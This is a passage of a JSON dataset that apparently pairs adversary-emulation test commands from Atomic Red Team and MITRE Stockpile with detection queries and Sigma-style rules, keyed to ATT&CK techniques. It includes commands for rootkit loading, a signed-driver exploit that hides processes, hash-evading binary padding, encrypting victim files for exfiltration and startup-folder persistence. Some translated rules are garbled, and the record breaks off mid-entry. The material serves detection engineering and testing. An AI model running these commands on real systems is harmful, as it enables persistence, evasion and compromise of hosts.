(CommandLine=\"*currentVersion\\\\\\\\windows*\" OR CommandLine=\"*currentVersion\\\\\\\\runServicesOnce*\" OR CommandLine=\"*currentVersion\\\\\\\\runServices*\" OR CommandLine=\"*winlogon\\\\*\" OR CommandLine=\"*currentVersion\\\\\\\\shellServiceObjectDelayLoad*\" OR CommandLine=\"*currentVersion\\\\\\\\runOnce*\" OR CommandLine=\"*currentVersion\\\\\\\\runOnceEx*\" OR CommandLine=\"*currentVersion\\\\\\\\run*\" OR CommandLine=\"*currentVersion\\\\\\\\policies\\\\\\\\explorer\\\\\\\\run*\" OR CommandLine=\"*currentcontrolset\\\\\\\\services*\")) | table Image,CommandLine,User,LogonGuid,Hashes,ParentProcessGuid,ParentCommandLine", "product": "Atomic Threat Coverage", "name": "splunk"}, {"query": "(event_id=\"1\" Image=\"*\\\\\\\\reg.exe\" CommandLine IN [\"*query*\", \"*save*\", \"*export*\"] CommandLine IN [\"*currentVersion\\\\\\\\windows*\", \"*currentVersion\\\\\\\\runServicesOnce*\", \"*currentVersion\\\\\\\\runServices*\", \"*winlogon\\\\*\", \"*currentVersion\\\\\\\\shellServiceObjectDelayLoad*\", \"*currentVersion\\\\\\\\runOnce*\", \"*currentVersion\\\\\\\\runOnceEx*\", \"*currentVersion\\\\\\\\run*\", \"*currentVersion\\\\\\\\policies\\\\\\\\explorer\\\\\\\\run*\", \"*currentcontrolset\\\\\\\\services*\"])", "product": "Atomic Threat Coverage", "name": "logpoint"}, {"query": "grep -P '^(?:.*(?=.*.*\\\\reg\\\\.exe)(?=.*(?:.*.*query.*|.*.*save.*|.*.*export.*))(?=.*(?:.*.*currentVersion\\\\windows.*|.*.*currentVersion\\\\runServicesOnce.*|.*.*currentVersion\\\\runServices.*|.*.*winlogon\\\\.*|.*.*currentVersion\\\\shellServiceObjectDelayLoad.*|.*.*currentVersion\\\\runOnce.*|.*.*currentVersion\\\\runOnceEx.*|.*.*currentVersion\\\\run.*|.*.*currentVersion\\\\policies\\\\explorer\\\\run.*|.*.*currentcontrolset\\\\services.*)))'", "product": "Atomic Threat Coverage", "name": "grep"}, {"query": "Yml\ntitle: windows system service discovery\ndescription: windows server 2016\nreferences:\ntags: T1007\nstatus: experimental\nauthor: 12306Bro\nlogsource:\n\u00a0\u00a0\u00a0\u00a0product: windows\n\u00a0\u00a0\u00a0\u00a0service: security\ndetection:\n\u00a0\u00a0\u00a0\u00a0selection:\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0EventID: 4688 # have created a new process.\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0Newprocessname: 'C: \\ Windows \\ System32 \\ sc.exe' # process information> new process name\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0Creatorprocessname: 'C: \\ windows \\ system32 \\ cmd.exe' # Process Information> Creator Process Name\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0Processcommandline: SC * # Process Information> process command line\n\u00a0\u00a0\u00a0\u00a0condition: selection\nlevel: medium", "product": "https://raw.githubusercontent.com/12306Bro/Threathunting-book/master/{}", "name": "Yml"}, {"query": "Yml\ntitle: windows system service discovery\ndescription: windows server 2016\nreferences:\ntags: T1007\nstatus: experimental\nauthor: 12306Bro\nlogsource:\n\u00a0\u00a0\u00a0\u00a0product: windows\n\u00a0\u00a0\u00a0\u00a0service: security\ndetection:\n\u00a0\u00a0\u00a0\u00a0selection1:\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0EventID: 4688 # have created a new process.\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0Newprocessname: 'C: \\ Windows \\ System32 \\ tasklist.exe' # process information> new process name\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0Creatorprocessname: 'C: \\ Windows \\ System32 \\ cmd.exe' # Process Information> Creator Process Name\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0Processcommandline: tasklist * # Process Information> process command line\n\u00a0\u00a0\u00a0\u00a0selection2: # * 5\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0EventID: 4703 # a user's privileges to be adjusted.\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0ProcessName: 'C: \\ Windows \\ System32 \\ whoami.exe' # process information> process name\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0EnabledPrivileges: 'SeDebugPrivilege' permission enabled #\n\u00a0\u00a0\u00a0\u00a0selection3:\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0EventID: 4690 # trying to duplicate a handle to an object.\n\u00a0\u00a0\u00a0\u00a0selection4:\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0EventID: 4658 # closed to object handles.\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0ProcessName: 'C: \\ Windows \\ System32 \\ wbem \\ WmiPrvSE.exe' # process information> process name\n\u00a0\u00a0\u00a0\u00a0selection5:\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0EventID: 4656 # objects have to handle the request.\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0Objectname: '\\ Device \\ HarddiskVolume4 \\ Windows \\ System32 \\ lsass.exe' # Object> object name\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0ProcessName: 'C: \\ Windows \\ System32 \\ wbem \\ WmiPrvSE.exe' # process information> process name\n\u00a0\u00a0\u00a0\u00a0selection6:\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0EventID: 4633 # trying to access the object.\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0Objectname: '\\ Device \\ HarddiskVolume4 \\ Windows \\ System32 \\ lsass.exe' # Object> object name\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0ProcessName: 'C: \\ Windows \\ System32 \\ wbem \\ WmiPrvSE.exe' # process information> process name\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0Access: read process memory access request information #> Access\n\u00a0\u00a0\u00a0\u00a0selection7:\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0EventID: 4658 # closed to object handles.\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0ProcessName: 'C: \\ Windows \\ System32 \\ wbem \\ WmiPrvSE.exe' # process information> process name\n\u00a0\u00a0\u00a0\u00a0selection8:\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0EventID: 4689 # exited process\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0ProcessName: 'C: \\ Windows \\ System32 \\ tasklist.exe' # process information> process name\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0Exitstatus: 0x0 # Process information> exit status\n\u00a0\u00a0\u00a0\u00a0timeframe: last 1m # can be adjusted according to actual situation\n\u00a0\u00a0\u00a0\u00a0condition: all of them\nlevel: medium", "product": "https://raw.githubusercontent.com/12306Bro/Threathunting-book/master/{}", "name": "Yml"}, {"query": "Yml\ntitle: windows system service discovery\ndescription: windows server 2016\nreferences:\ntags: T1007\nstatus: experimental\nauthor: 12306Bro\nlogsource:\n\u00a0\u00a0\u00a0\u00a0product: windows\n\u00a0\u00a0\u00a0\u00a0service: security\ndetection:\n\u00a0\u00a0\u00a0\u00a0selection1:\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0EventID: 4688 # have created a new process.\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0Newprocessname: 'C: \\ Windows \\ System32 \\ net.exe' # process information> new process name\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0Creatorprocessname: 'C: \\ windows \\ system32 \\ cmd.exe' # Process Information> Creator Process Name\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0Processcommandline: net start # Process Information> process command line\n\u00a0\u00a0\u00a0\u00a0selection2:\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0EventID: 4688 # have created a new process.\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0Newprocessname: 'C: \\ Windows \\ System32 \\ net1.exe' # process information> new process name\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0Creatorprocessname: 'C: \\ Windows \\ System32 \\ net.exe' # Process Information> Creator Process Name\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0Processcommandline: C: \\ Windows \\ system32 \\ net1 start # Process Information> process command line\n\u00a0\u00a0\u00a0\u00a0selection3:\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0EventID: 4689 # exited process\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0ProcessName: 'C: \\ Windows \\ System32 \\ net1.exe' # process information> process name\n\u00a0\u00a0\u00a0\u00a0selection4:\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0EventID: 4689 # exited process\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0ProcessName: 'C: \\ Windows \\ System32 \\ net.exe' # process information> process name\n\u00a0\u00a0\u00a0\u00a0timeframe: last 1m # can be adjusted according to actual situation\n\u00a0\u00a0\u00a0\u00a0condition: all of them\nlevel: medium", "product": "https://raw.githubusercontent.com/12306Bro/Threathunting-book/master/{}", "name": "Yml"}], "possible_detections": [], "attack_paths": []}, {"commands": [{"source": "atomics/T1009/T1009.yaml", "command": "dd if=/dev/zero bs=1 count=1 >> /tmp/evil-binary\n", "name": null}, {"source": "Kirtar22/Litmus_Test", "command": "dd if=/dev/zero bs=1 count=1 >> #{file_to_pad}", "name": null}, {"source": "Kirtar22/Litmus_Test", "command": "```", "name": null}, {"source": "Kirtar22/Litmus_Test", "command": "sha1sum welcome.sh >before", "name": null}, {"source": "Kirtar22/Litmus_Test", "command": "dd if=/dev/zero bs=1 count=1 >> welcome.sh", "name": null}, {"source": "Kirtar22/Litmus_Test", "command": "<<", "name": null}, {"source": "Kirtar22/Litmus_Test", "command": "1+0 records in", "name": null}, {"source": "Kirtar22/Litmus_Test", "command": "1+0 records out", "name": null}, {"source": "Kirtar22/Litmus_Test", "command": "1 byte (1 B) copied, 0.000221464 s, 4.5 kB/s", "name": null}, {"source": "Kirtar22/Litmus_Test", "command": ">>", "name": null}, {"source": "Kirtar22/Litmus_Test", "command": "sha1sum welcome.sh >after", "name": null}, {"source": "Kirtar22/Litmus_Test", "command": "cmp before after", "name": null}, {"source": "Kirtar22/Litmus_Test", "command": "<<before after differ: byte 1, line 1>>", "name": null}, {"source": "Kirtar22/Litmus_Test", "command": "```", "name": null}], "command_list": ["dd if=/dev/zero bs=1 count=1 >> /tmp/evil-binary\n", "dd if=/dev/zero bs=1 count=1 >> #{file_to_pad}", "```", "sha1sum welcome.sh >before", "dd if=/dev/zero bs=1 count=1 >> welcome.sh", "<<", "1+0 records in", "1+0 records out", "1 byte (1 B) copied, 0.000221464 s, 4.5 kB/s", ">>", "sha1sum welcome.sh >after", "cmp before after", "<<before after differ: byte 1, line 1>>", "```"], "technique_id": "T1009", "parsed_datasets": [{"Atomic Red Team Test - Binary Padding": {"display_name": "Binary Padding", "atomic_tests": [{"description": "Uses dd to add a zero to the binary to change the hash\n", "supported_platforms": ["macos", "linux"], "name": "Pad Binary to Change Hash - Linux/macOS dd", "input_arguments": {"file_to_pad": {"default": "/tmp/evil-binary", "type": "Path", "description": "Path of binary to be padded"}}, "executor": {"elevation_required": false, "command": "dd if=/dev/zero bs=1 count=1 >> #{file_to_pad}\n", "name": "sh"}}], "attack_technique": "T1009"}}], "queries": [{"query": "title: Failed Code Integrity Checks\nid: 470ec5fa-7b4e-4071-b200-4c753100f49b\nstatus: stable\ndescription: Code integrity failures may indicate tampered executables.\nauthor: Thomas Patzke\ntags:\n    - attack.defense_evasion\n    - attack.t1009\nlogsource:\n    product: windows\n    service: security\ndetection:\n    selection:\n        EventID:\n            - 5038\n            - 6281\n    condition: selection\nfalsepositives:\n    - Disk device errors\nlevel: low", "product": "Atomic Threat Coverage", "name": "Sigma rule"}, {"query": "title: Failed Code Integrity Checks\nid: 470ec5fa-7b4e-4071-b200-4c753100f49b\nstatus: stable\ndescription: Code integrity failures may indicate tampered executables.\nauthor: Thomas Patzke\ntags:\n    - attack.defense_evasion\n    - attack.t1009\nlogsource:\n    product: windows\n    service: security\ndetection:\n    selection:\n        EventID:\n            - 5038\n            - 6281\n    condition: selection\nfalsepositives:\n    - Disk device errors\nlevel: low", "product": "Atomic Threat Coverage", "name": "Sigma rule"}, {"query": "EventID:(\"5038\" OR \"6281\")", "product": "Atomic Threat Coverage", "name": "es-qs"}, {"query": "curl -s -XPUT -H \\'Content-Type: application/json\\' --data-binary @- localhost:9200/_watcher/watch/Failed-Code-Integrity-Checks <<EOF\\n{\\n  \"metadata\": {\\n    \"title\": \"Failed Code Integrity Checks\",\\n    \"description\": \"Code integrity failures may indicate tampered executables.\",\\n    \"tags\": [\\n      \"attack.defense_evasion\",\\n      \"attack.t1009\"\\n    ],\\n    \"query\": \"EventID:(\\\\\"5038\\\\\" OR \\\\\"6281\\\\\")\"\\n  },\\n  \"trigger\": {\\n    \"schedule\": {\\n      \"interval\": \"30m\"\\n    }\\n  },\\n  \"input\": {\\n    \"search\": {\\n      \"request\": {\\n        \"body\": {\\n          \"size\": 0,\\n          \"query\": {\\n            \"bool\": {\\n              \"must\": [\\n                {\\n                  \"query_string\": {\\n                    \"query\": \"EventID:(\\\\\"5038\\\\\" OR \\\\\"6281\\\\\")\",\\n                    \"analyze_wildcard\": true\\n                  }\\n                }\\n              ],\\n              \"filter\": {\\n                \"range\": {\\n                  \"timestamp\": {\\n                    \"gte\": \"now-30m/m\"\\n                  }\\n                }\\n              }\\n            }\\n          }\\n        },\\n        \"indices\": []\\n      }\\n    }\\n  },\\n  \"condition\": {\\n    \"compare\": {\\n      \"ctx.payload.hits.total\": {\\n        \"not_eq\": 0\\n      }\\n    }\\n  },\\n  \"actions\": {\\n    \"send_email\": {\\n      \"email\": {\\n        \"to\": \"root@localhost\",\\n        \"subject\": \"Sigma Rule \\'Failed Code Integrity Checks\\'\",\\n        \"body\": \"Hits:\\\\n{{#ctx.payload.hits.hits}}{{_source}}\\\\n================================================================================\\\\n{{/ctx.payload.hits.hits}}\",\\n        \"attachments\": {\\n          \"data.json\": {\\n            \"data\": {\\n              \"format\": \"json\"\\n            }\\n          }\\n        }\\n      }\\n    }\\n  }\\n}\\nEOF\\n", "product": "Atomic Threat Coverage", "name": "xpack-watcher"}, {"query": "EventID:(\"5038\" \"6281\")", "product": "Atomic Threat Coverage", "name": "graylog"}, {"query": "(EventID=\"5038\" OR EventID=\"6281\")", "product": "Atomic Threat Coverage", "name": "splunk"}, {"query": "(event_source=\"Microsoft-Windows-Security-Auditing\" event_id IN [\"5038\", \"6281\"])", "product": "Atomic Threat Coverage", "name": "logpoint"}, {"query": "grep -P '^(?:.*5038|.*6281)'", "product": "Atomic Threat Coverage", "name": "grep"}, {"query": "```index=linux sourcetype=\"bash_history\" bash_command=\"dd *\"```", "product": "Splunk", "name": null}, {"query": "", "product": "Splunk", "name": null}], "possible_detections": [{"data_source": "```bash_history logs```"}], "attack_paths": []}, {"commands": [{"source": "atomics/T1010/T1010.yaml", "command": "C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\csc.exe -out:#{output_file_name} PathToAtomicsFolder\\T1010\\src\\T1010.cs\n#{output_file_name}\n", "name": null}, {"source": "atomics/T1010/T1010.yaml", "command": "C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\csc.exe -out:$env:TEMP\\T1010.exe PathToAtomicsFolder\\T1010\\src\\T1010.cs\n$env:TEMP\\T1010.exe\n", "name": null}, {"source": "data/abilities/discovery/5c65eec8-4839-4713-a4e1-86b2e75d1927.yml", "command": {"windows": {"psh": {"command": "$x = Get-Process | Where-Object {$_.MainWindowTitle -ne \"\"} | Select-Object MainWindowTitle;\n$a = New-Object -com \"Shell.Application\"; $b = $a.windows() | select-object LocationName;\nwrite-host ($x | Format-List | Out-String) ($b | Format-List | Out-String)"}}}, "name": "Extracts the names of all open non-explorer windows, and the locations of all explorer windows."}], "command_list": ["C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\csc.exe -out:#{output_file_name} PathToAtomicsFolder\\T1010\\src\\T1010.cs\n#{output_file_name}\n", "C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\csc.exe -out:$env:TEMP\\T1010.exe PathToAtomicsFolder\\T1010\\src\\T1010.cs\n$env:TEMP\\T1010.exe\n", {"windows": {"psh": {"command": "$x = Get-Process | Where-Object {$_.MainWindowTitle -ne \"\"} | Select-Object MainWindowTitle;\n$a = New-Object -com \"Shell.Application\"; $b = $a.windows() | select-object LocationName;\nwrite-host ($x | Format-List | Out-String) ($b | Format-List | Out-String)"}}}], "technique_id": "T1010", "parsed_datasets": [{"Atomic Red Team Test - Application Window Discovery": {"display_name": "Application Window Discovery", "atomic_tests": [{"dependencies": [{"description": "T1010.cs must exist on disk at specified location (#{input_source_code})\n", "get_prereq_command": "New-Item -Type Directory (split-path #{input_source_code}) -ErrorAction ignore | Out-Null\nInvoke-WebRequest https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1010/src/T1010.cs -OutFile \"#{input_source_code}\"\n", "prereq_command": "if (Test-Path #{input_source_code}) {exit 0} else {exit 1}\n"}], "supported_platforms": ["windows"], "name": "List Process Main Windows - C# .NET", "executor": {"elevation_required": false, "command": "C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\csc.exe -out:#{output_file_name} #{input_source_code}\n#{output_file_name}\n", "name": "command_prompt", "cleanup_command": "del /f /q /s #{output_file_name} >nul 2>&1\n"}, "description": "Compiles and executes C# code to list main window titles associated with each process.\n", "input_arguments": {"input_source_code": {"default": "PathToAtomicsFolder\\T1010\\src\\T1010.cs", "type": "path", "description": "Path to source of C# code"}, "output_file_name": {"default": "$env:TEMP\\T1010.exe", "type": "string", "description": "Name of output binary"}}, "dependency_executor_name": "powershell"}], "attack_technique": "T1010"}}, {"Mitre Stockpile - Extracts the names of all open non-explorer windows, and the locations of all explorer windows.": {"platforms": {"windows": {"psh": {"command": "$x = Get-Process | Where-Object {$_.MainWindowTitle -ne \"\"} | Select-Object MainWindowTitle;\n$a = New-Object -com \"Shell.Application\"; $b = $a.windows() | select-object LocationName;\nwrite-host ($x | Format-List | Out-String) ($b | Format-List | Out-String)"}}}, "description": "Extracts the names of all open non-explorer windows, and the locations of all explorer windows.", "tactic": "discovery", "technique": {"attack_id": "T1010", "name": "Application Window Discovery"}, "id": "5c65eec8-4839-4713-a4e1-86b2e75d1927", "name": "Application Window Discovery"}}], "queries": [{"query": "Yml\ntitle: windows local Powershell command execution, enumerate the application window\ndescription: windows server 2016\nreferences: No\ntags: T1010\nstatus: experimental\nauthor: 12306Bro\nlogsource:\n\u00a0\u00a0\u00a0\u00a0product: windows\n\u00a0\u00a0\u00a0\u00a0service: powershell\ndetection:\n\u00a0\u00a0\u00a0\u00a0selection:\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0EventID: 4104 # remote command execution\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0message:\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0- 'get-process | where-object {. $ _ Mainwindowtitle -ne \"\"} | Select-Object mainwindowtitle' # command line parameters based on the detection, the detection rate is low\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0-. [Activator] :: CreateInstance ([type] :: GetTypeFromCLSID ( \"13709620-C279-11CE-A49E-444553540000\")) windows () # command line parameters based on the detection, the detection rate is low\n\u00a0\u00a0\u00a0\u00a0condition: selection\nlevel: low", "product": "https://raw.githubusercontent.com/12306Bro/Threathunting-book/master/{}", "name": "Yml"}], "possible_detections": [], "attack_paths": []}, {"commands": [{"source": "atomics/T1014/T1014.yaml", "command": "sudo insmod Module.ko\n", "name": null}, {"source": "atomics/T1014/T1014.yaml", "command": "sudo modprobe Module.ko\n", "name": null}, {"source": "atomics/T1014/T1014.yaml", "command": "puppetstrings C:\\Drivers\\driver.sys\n", "name": null}], "command_list": ["sudo insmod Module.ko\n", "sudo modprobe Module.ko\n", "puppetstrings C:\\Drivers\\driver.sys\n"], "technique_id": "T1014", "parsed_datasets": [{"Atomic Red Team Test - Loadable Kernel Module based Rootkit": {"display_name": "Loadable Kernel Module based Rootkit", "atomic_tests": [{"description": "Loadable Kernel Module based Rootkit\n", "supported_platforms": ["linux"], "name": "Loadable Kernel Module based Rootkit", "input_arguments": {"rootkit_file": {"default": "Module.ko", "type": "String", "description": "Path To Module"}}, "executor": {"command": "sudo insmod #{rootkit_file}\n", "name": "sh"}}, {"description": "Loadable Kernel Module based Rootkit\n", "supported_platforms": ["linux"], "name": "Loadable Kernel Module based Rootkit", "input_arguments": {"rootkit_file": {"default": "Module.ko", "type": "String", "description": "Path To Module"}}, "executor": {"command": "sudo modprobe #{rootkit_file}\n", "name": "sh"}}, {"description": "This test exploits a signed driver to execute code in Kernel.\nSHA1 C1D5CF8C43E7679B782630E93F5E6420CA1749A7\nWe leverage the work done here:\nhttps://zerosum0x0.blogspot.com/2017/07/puppet-strings-dirty-secret-for-free.html\nThe hash of our PoC Exploit is\nSHA1 DD8DA630C00953B6D5182AA66AF999B1E117F441\nThis will simulate hiding a process.\nIt would be wise if you only run this in a test environment\n", "supported_platforms": ["windows"], "name": "Windows Signed Driver Rootkit Test", "input_arguments": {"driver_path": {"default": "C:\\Drivers\\driver.sys", "type": "Path", "description": "Path to the vulnerable driver"}}, "executor": {"command": "puppetstrings #{driver_path}\n", "name": "command_prompt"}}], "attack_technique": "T1014"}}], "queries": [], "possible_detections": [], "attack_paths": []}, {"commands": [{"source": "atomics/T1022/T1022.yaml", "command": "mkdir /tmp/victim-files\ncd /tmp/victim-files\ntouch a b c d e f g\necho \"creating zip with password 'insert password here'\"\nzip --password \"insert password here\" ./victim-files.zip ./*\necho \"encrypting file with gpg, you will need to provide a password\"\ngpg -c /tmp/victim-files/victim-filex.zip\n#<enter passphrase and confirm>\nls -l\n", "name": null}, {"source": "atomics/T1022/T1022.yaml", "command": "mkdir .\\tmp\\victim-files\ncd .\\tmp\\victim-files\necho \"This file will be encrypted\" > .\\encrypted_file.txt\nrar a -hp\"blue\" hello.rar\ndir\n", "name": null}, {"source": "atomics/T1022/T1022.yaml", "command": "path=%path%;\"C:\\Program Files (x86)\\winzip\"\nmkdir .\\tmp\\victim-files\ncd .\\tmp\\victim-files\necho \"This file will be encrypted\" > .\\encrypted_file.txt\n\"%ProgramFiles%\\WinZip\\winzip64.exe\" -min -a -s\"hello\" archive.zip *\ndir\n", "name": null}, {"source": "atomics/T1022/T1022.yaml", "command": "path=%path%;\"C:\\Program Files (x86)\\winzip\"\nmkdir .\\tmp\\victim-files\ncd .\\tmp\\victim-files\necho \"This file will be encrypted\" > .\\encrypted_file.txt\n\"%ProgramFiles%\\WinZip\\winzip64.exe\" -min -a -s\"hello\" archive.zip *\ndir\n", "name": null}, {"source": "atomics/T1022/T1022.yaml", "command": "path=%path%;\"C:\\Program Files (x86)\\winzip\"\nmkdir .\\tmp\\victim-files\ncd .\\tmp\\victim-files\necho \"This file will be encrypted\" > .\\encrypted_file.txt\n\"#{winzip_exe}\" -min -a -s\"hello\" archive.zip *\ndir\n", "name": null}, {"source": "atomics/T1022/T1022.yaml", "command": "mkdir $PathToAtomicsFolder\\T1022\\victim-files\ncd $PathToAtomicsFolder\\T1022\\victim-files\necho \"This file will be encrypted\" > .\\encrypted_file.txt\n7z a archive.7z -pblue\ndir\n", "name": null}], "command_list": ["mkdir /tmp/victim-files\ncd /tmp/victim-files\ntouch a b c d e f g\necho \"creating zip with password 'insert password here'\"\nzip --password \"insert password here\" ./victim-files.zip ./*\necho \"encrypting file with gpg, you will need to provide a password\"\ngpg -c /tmp/victim-files/victim-filex.zip\n#<enter passphrase and confirm>\nls -l\n", "mkdir .\\tmp\\victim-files\ncd .\\tmp\\victim-files\necho \"This file will be encrypted\" > .\\encrypted_file.txt\nrar a -hp\"blue\" hello.rar\ndir\n", "path=%path%;\"C:\\Program Files (x86)\\winzip\"\nmkdir .\\tmp\\victim-files\ncd .\\tmp\\victim-files\necho \"This file will be encrypted\" > .\\encrypted_file.txt\n\"%ProgramFiles%\\WinZip\\winzip64.exe\" -min -a -s\"hello\" archive.zip *\ndir\n", "path=%path%;\"C:\\Program Files (x86)\\winzip\"\nmkdir .\\tmp\\victim-files\ncd .\\tmp\\victim-files\necho \"This file will be encrypted\" > .\\encrypted_file.txt\n\"%ProgramFiles%\\WinZip\\winzip64.exe\" -min -a -s\"hello\" archive.zip *\ndir\n", "path=%path%;\"C:\\Program Files (x86)\\winzip\"\nmkdir .\\tmp\\victim-files\ncd .\\tmp\\victim-files\necho \"This file will be encrypted\" > .\\encrypted_file.txt\n\"#{winzip_exe}\" -min -a -s\"hello\" archive.zip *\ndir\n", "mkdir $PathToAtomicsFolder\\T1022\\victim-files\ncd $PathToAtomicsFolder\\T1022\\victim-files\necho \"This file will be encrypted\" > .\\encrypted_file.txt\n7z a archive.7z -pblue\ndir\n"], "technique_id": "T1022", "parsed_datasets": [{"Atomic Red Team Test - Data Encrypted": {"display_name": "Data Encrypted", "atomic_tests": [{"description": "Encrypt data for exiltration\n", "supported_platforms": ["macos", "linux"], "name": "Data Encrypted with zip and gpg symmetric", "executor": {"prereq_command": "which gpg", "elevation_required": false, "command": "mkdir /tmp/victim-files\ncd /tmp/victim-files\ntouch a b c d e f g\necho \"creating zip with password 'insert password here'\"\nzip --password \"insert password here\" ./victim-files.zip ./*\necho \"encrypting file with gpg, you will need to provide a password\"\ngpg -c /tmp/victim-files/victim-filex.zip\n#<enter passphrase and confirm>\nls -l\n", "cleanup_command": "rm -Rf /tmp/victim-files\n", "name": "sh"}}, {"description": "Note: Requires winrar installation\nrar a -p\"blue\" hello.rar (VARIANT)\n", "supported_platforms": ["windows"], "name": "Compress Data and lock with password for Exfiltration with winrar", "executor": {"elevation_required": false, "command": "mkdir .\\tmp\\victim-files\ncd .\\tmp\\victim-files\necho \"This file will be encrypted\" > .\\encrypted_file.txt\nrar a -hp\"blue\" hello.rar\ndir\n", "name": "command_prompt"}}, {"dependencies": [{"description": "Winzip must be installed\n", "get_prereq_command": "if(Invoke-WebRequestVerifyHash \"#{winzip_url}\" \"$env:Temp\\winzip.exe\" #{winzip_hash}){\n  Write-Host Follow the installation prompts to continue\n  cmd /c \"$env:Temp\\winzip.exe\"\n}\n", "prereq_command": "cmd /c 'if not exist \"#{winzip_exe}\" (echo 1) else (echo 0)'\n"}], "supported_platforms": ["windows"], "name": "Compress Data and lock with password for Exfiltration with winzip", "executor": {"elevation_required": false, "command": "path=%path%;\"C:\\Program Files (x86)\\winzip\"\nmkdir .\\tmp\\victim-files\ncd .\\tmp\\victim-files\necho \"This file will be encrypted\" > .\\encrypted_file.txt\n\"#{winzip_exe}\" -min -a -s\"hello\" archive.zip *\ndir\n", "name": "command_prompt"}, "description": "Note: Requires winzip installation\nwzzip sample.zip -s\"blueblue\" *.txt (VARIANT)\n", "input_arguments": {"winzip_exe": {"default": "%ProgramFiles%\\WinZip\\winzip64.exe", "type": "Path", "description": "Path to installed Winzip executable"}, "winzip_hash": {"default": "B59DB592B924E963C21DA8709417AC0504F6158CFCB12FE5536F4A0E0D57D7FB", "type": "String", "description": "File hash of the Windows Credential Editor zip file"}, "winzip_url": {"default": "https://download.winzip.com/gl/nkln/winzip24-home.exe", "type": "url", "description": "Path to download Windows Credential Editor zip file"}}, "dependency_executor_name": "powershell"}, {"description": "Note: Requires 7zip installation\n", "supported_platforms": ["windows"], "name": "Compress Data and lock with password for Exfiltration with 7zip", "executor": {"elevation_required": false, "command": "mkdir $PathToAtomicsFolder\\T1022\\victim-files\ncd $PathToAtomicsFolder\\T1022\\victim-files\necho \"This file will be encrypted\" > .\\encrypted_file.txt\n7z a archive.7z -pblue\ndir\n", "name": "command_prompt"}}], "attack_technique": "T1022"}}], "queries": [], "possible_detections": [], "attack_paths": []}, {"commands": [{"source": "atomics/T1023/T1023.yaml", "command": "echo [InternetShortcut] > test.url && echo URL=C:\\windows\\system32\\calc.exe >> shortcutname.url && shortcutname.url >nul 2>&1\n", "name": null}, {"source": "atomics/T1023/T1023.yaml", "command": "$Shell = New-Object -ComObject (\"WScript.Shell\")\n$ShortCut = $Shell.CreateShortcut(\"$env:APPDATA\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\T1023.lnk\")\n$ShortCut.TargetPath=\"cmd.exe\"\n$ShortCut.WorkingDirectory = \"C:\\Windows\\System32\";\n$ShortCut.WindowStyle = 1;\n$ShortCut.Description = \"T1023.\";\n$ShortCut.Save()\n\n$Shell = New-Object -ComObject (\"WScript.Shell\")\n$ShortCut = $Shell.CreateShortcut(\"$env:ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\T1023.lnk\")\n$ShortCut.TargetPath=\"cmd.exe\"\n$ShortCut.WorkingDirectory = \"C:\\Windows\\System32\";\n$ShortCut.WindowStyle = 1;\n$ShortCut.Description = \"T1023.\";\n$ShortCut.Save()\n", "name": null}, {"source": 